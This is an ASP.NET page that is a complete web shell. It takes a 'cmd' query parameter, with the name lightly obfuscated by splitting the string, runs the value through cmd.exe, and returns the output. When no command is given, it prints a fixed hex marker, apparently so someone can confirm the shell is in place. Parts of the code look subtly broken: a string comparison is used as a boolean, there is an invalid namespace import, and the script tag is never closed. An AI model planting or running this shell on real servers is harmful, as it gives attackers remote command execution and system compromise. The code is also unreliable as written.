<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="String" %>
<script Language="c#" runat="server">

void Page_Load(object sender, EventArgs e)
{
    if ( String.Compare( Request.QueryString["cm" + "d"],"") )
    {
        Response.Write( "15825b40c6dace2a" + "7cf5d4ab8ed434d5" );
    }
    else
    {
        Response.Write(Server.HtmlEncode(ExcuteCmd(Request.QueryString["cm" + "d"])));
    }
}

string ExcuteCmd(string arg)
{
    ProcessStartInfo npsi = new ProcessStartInfo();
    npsi.FileName = "cm"+"d.exe";
    npsi.Arguments = "/c "+arg;
    npsi.RedirectStandardOutput = true;
    npsi.UseShellExecute = false;
    Process p = Process.Start(npsi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
}


